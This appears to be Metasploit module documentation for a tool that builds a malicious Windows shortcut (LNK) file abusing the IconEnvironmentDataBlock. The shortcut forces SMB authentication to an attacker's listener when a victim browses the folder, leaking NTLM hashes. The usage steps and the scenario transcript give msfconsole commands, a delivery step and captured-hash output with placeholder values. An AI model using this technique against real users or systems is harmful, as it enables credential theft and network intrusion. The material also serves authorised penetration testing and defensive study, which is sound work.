## Vulnerable Application

Windows systems using Explorer to browse directories with LNK files, where the IconEnvironmentDataBlock can force SMB authentication leaks.

References:
- [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)

Disclosure Date: 2025-05-16.

## Verification Steps

1. Start msfconsole.
1. Load the module: `use auxiliary/fileformat/iconenvironmentdatablock_lnk`.
1. Set options like FILENAME, or others as needed.
1. Execute the module: `run`.
1. A malicious LNK file is generated.
1. Place the LNK in a target directory.
1. Browse the directory in Windows Explorer to trigger the SMB connection.
1. Check the console for captured NTLM hashes.

## Options


### DESCRIPTION

Optional description for the shortcut. If unset, a random sentence is generated.

Example:
```
set DESCRIPTION System Update
```

### ICON_PATH

Optional icon path for the LNK. If unset, a random system icon path is generated.

Example:
```
set ICON_PATH %SystemRoot%\\System32\\shell32.dll
```

### PADDING_SIZE

Size of padding in the command arguments.

Default: 10

Example:
```
set PADDING_SIZE 20
```


## Scenarios

### NTLM Hash Capture via Integrated Server

Target: Windows system with Explorer.

```
msf > use auxiliary/fileformat/iconenvironmentdatablock_lnk
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set FILENAME leak.lnk
FILENAME => leak.lnk
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set SRVHOST 192.168.1.25
SRVHOST => 192.168.1.25
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set DESCRIPTION Fake Shortcut
DESCRIPTION => Fake Shortcut
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set PADDING_SIZE 15
PADDING_SIZE => 15
msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > run

[*] Creating 'leak.lnk' file...
[+] LNK file created: leak.lnk
[*] Listening for hashes on 192.168.1.25:445
[*] Auxiliary module execution completed
```

Deliver `leak.lnk` to a target folder. Browsing the folder triggers an SMB connection:

```
[*] SMB Captured - 2025-09-18 21:07:00 +0530
NTLMv2 Response Captured from 192.168.1.50:49180 - 192.168.1.50
USER:victim DOMAIN:VICTIMPC OS: Windows 10 LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:samplehash
NT_CLIENT_CHALLENGE:samplechallenge
```
